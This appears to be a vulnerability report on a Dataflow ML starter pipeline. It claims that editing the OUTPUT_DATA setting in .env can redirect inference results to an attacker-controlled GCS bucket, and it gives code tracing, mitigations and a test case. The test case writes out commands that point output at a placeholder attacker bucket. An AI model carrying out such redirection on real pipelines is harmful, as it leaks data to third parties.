- **Vulnerability Name:** Output Data Redirection via Environment Variable Injection

- **Description:**
  An attacker can modify the `.env` file, specifically the `OUTPUT_DATA` environment variable, to redirect the output of the machine learning pipeline to a Google Cloud Storage (GCS) bucket under their control. This is possible because the application reads the output path directly from the `.env` file without any validation or sanitization.

  **Steps to trigger the vulnerability:**
  1.  Clone the project repository if the attacker is not already a collaborator.
  2.  Navigate to the project directory.
  3.  Edit the `.env` file.
  4.  Locate the line starting with `OUTPUT_DATA=`.
  5.  Change the value of `OUTPUT_DATA` to point to a GCS bucket controlled by the attacker, for example: `OUTPUT_DATA=gs://attacker-controlled-bucket/exfiltrated_data.txt`.
  6.  Run any of the `make run-df-*` commands (e.g., `make run-df-cpu`, `make run-df-gpu`, `make run-df-gpu-flex`) to execute the Dataflow pipeline.
  7.  The pipeline will now write the ML inference results to the attacker-specified GCS bucket instead of the intended destination.
  8.  The attacker can then access the `exfiltrated_data.txt` file in their GCS bucket to obtain the machine learning inference results.

- **Impact:**
  Data Exfiltration. An attacker can successfully exfiltrate potentially sensitive machine learning inference results by redirecting the pipeline's output to a storage location they control. This could lead to a breach of confidentiality and unauthorized access to the processed data.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  None. The project directly uses the `OUTPUT_DATA` environment variable from the `.env` file without any validation or sanitization.

- **Missing Mitigations:**
  - **Input Validation and Sanitization:** Implement validation for the `OUTPUT_DATA` variable to ensure it conforms to expected patterns (e.g., whitelisted GCS bucket prefixes) and sanitize the input to prevent malicious paths.
  - **Principle of Least Privilege:** Ensure that the Dataflow job's service account has the minimum necessary permissions. Restrict write access to only the intended output GCS bucket and prevent access to other buckets.
  - **Configuration Management:** Consider using a more secure configuration management system instead of relying solely on `.env` files, especially for sensitive production deployments. Options include using Google Cloud Secret Manager or environment configuration services.
  - **Documentation:** Clearly document the security risks associated with modifying the `.env` file and advise users against using untrusted configurations.

- **Preconditions:**
  - The attacker needs to be able to modify the `.env` file. This could be achieved through various means, such as:
    -  Compromising the environment where the pipeline is run if the `.env` file is deployed with the application.
    -  If the attacker is a collaborator or has write access to the repository and can modify the `.env` file before deployment.
    -  In a development or testing environment where security practices might be less strict and the `.env` file is easily accessible or modifiable.

- **Source Code Analysis:**

  1. **`.env` File (Configuration Injection Point):**
     The `.env` file stores environment variables, including `OUTPUT_DATA`.

     ```
     OUTPUT_DATA="gs://temp-storage-for-end-to-end-tests/torch/result_gpu_xqhu.txt"
     ```

  2. **`Makefile` (Environment Variable Usage):**
     The `Makefile` sources the `.env` file and uses the `OUTPUT_DATA` variable when running the `run.py` script. For example, in the `run-df-cpu` target (simplified for clarity):

     ```makefile
     run-df-cpu: ...
         python my_project/run.py \
             --input $(INPUT_DATA) \
             --output $(OUTPUT_DATA) \
             ...
     ```
     The `$(OUTPUT_DATA)` in the `Makefile` is directly substituted with the value from the `.env` file.

  3. **`my_project/run.py` (Command Line Argument Parsing and SinkConfig):**
     The `run.py` script uses `argparse` to parse command-line arguments, including `--output`.

     ```python
     def parse_known_args(argv):
         parser = argparse.ArgumentParser()
         parser.add_argument("--output", dest="output", required=True, help="Path where to save output predictions.")
         ...
         return parser.parse_known_args(argv)

     def run(argv=None, save_main_session=True, test_pipeline=None) -> PipelineResult:
         known_args, pipeline_args = parse_known_args(argv)
         ...
         sink_config = SinkConfig(output=known_args.output) # SinkConfig is created using the parsed output path
         ...
         build_pipeline(pipeline, source_config=source_config, sink_config=sink_config, model_config=model_config)
         ...
     ```
     The `--output` argument's value, which originates from the `OUTPUT_DATA` environment variable via the `Makefile`, is used to create a `SinkConfig` object.

  4. **`my_project/config.py` (`SinkConfig` Definition):**
     The `SinkConfig` class simply stores the `output` path without any validation.

     ```python
     class SinkConfig(BaseModel):
         output: str = Field(..., description="the output path to save results as a text file")
     ```

  5. **`my_project/pipeline.py` (`build_pipeline` and Output Sink):**
     The `build_pipeline` function receives the `sink_config` and uses `sink_config.output` directly in `beam.io.WriteToText` or `beam.io.fileio.WriteToFiles`.

     ```python
     def build_pipeline(pipeline, source_config: SourceConfig, sink_config: SinkConfig, model_config: ModelConfig) -> None:
         ...
         predictions = ( ... ) # Pipeline steps leading to predictions

         if source_config.streaming:
             (
                 predictions
                 | "WriteOutputToGCS"
                 >> beam.io.fileio.WriteToFiles(sink_config.output, shards=0) # sink_config.output used directly as output path
             )
         else:
             # save the predictions to a text file
             predictions | "WriteOutputToGCS" >> beam.io.WriteToText( # sink_config.output used directly as output path
                 sink_config.output, shard_name_template="", append_trailing_newlines=True
             )
     ```
     As shown in the code flow, the `OUTPUT_DATA` environment variable, after being processed through `Makefile`, `run.py`, and `config.py`, is directly used as the output path in `pipeline.py` without any validation. This allows an attacker to control the output destination by modifying the `.env` file.

- **Security Test Case:**

  **Pre-requisites:**
  - Access to the project codebase.
  - Google Cloud SDK (`gcloud`) configured and authenticated.
  - `make` installed.
  - An attacker-controlled Google Cloud Storage bucket (e.g., `gs://attacker-controlled-bucket`).

  **Steps:**
  1. **Clone the Repository:**
     If the attacker does not have the code, clone the repository to their local machine:
     ```bash
     git clone https://github.com/google/dataflow-ml-starter.git
     cd dataflow-ml-starter
     ```

  2. **Modify `.env` File:**
     Copy the template `.env` file and modify the `OUTPUT_DATA` variable to point to the attacker's GCS bucket:
     ```bash
     cp .env.template .env
     echo "OUTPUT_DATA=gs://attacker-controlled-bucket/exfiltrated_data.txt" >> .env
     ```
     *(Alternatively, use an editor to modify the `.env` file directly)*

  3. **Run the Dataflow Pipeline:**
     Execute the Dataflow pipeline using `make run-df-cpu`. This will trigger a Dataflow job that processes the sample data and writes the output.
     ```bash
     make run-df-cpu
     ```

  4. **Verify Data Exfiltration:**
     After the Dataflow job completes successfully, check the attacker-controlled GCS bucket (`gs://attacker-controlled-bucket`). The file `exfiltrated_data.txt` should now exist and contain the ML inference results.

     You can verify this using `gsutil`:
     ```bash
     gsutil ls gs://attacker-controlled-bucket/exfiltrated_data.txt
     gsutil cat gs://attacker-controlled-bucket/exfiltrated_data.txt
     ```
     If the file exists and contains the prediction results, the vulnerability is confirmed.

This test case demonstrates that by modifying the `OUTPUT_DATA` environment variable in the `.env` file, an attacker can successfully redirect the output of the Dataflow ML pipeline to an attacker-controlled GCS bucket, achieving data exfiltration.
